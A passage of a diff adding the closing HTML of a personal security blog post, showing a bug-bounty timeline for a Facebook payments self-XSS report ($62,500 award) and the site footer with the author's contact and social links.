+<p>Nov 19, 2024 — Bug Fixed by Facebook</p>
+
+<p>Nov 20, 2024 — <strong>$62,500</strong> bounty awarded by Meta</p>
+
+  </div><a class="u-url" href="/uncategorized/2026/01/15/self-xss-facebook-payments.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Youssef Sammouda (sam0) personal blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Youssef Sammouda (sam0) personal blog</li><li><a class="u-email" href="mailto:ysamm@proton.me">ysamm@proton.me</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">samm0uda</span></a></li><li><a href="https://www.twitter.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">samm0uda</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
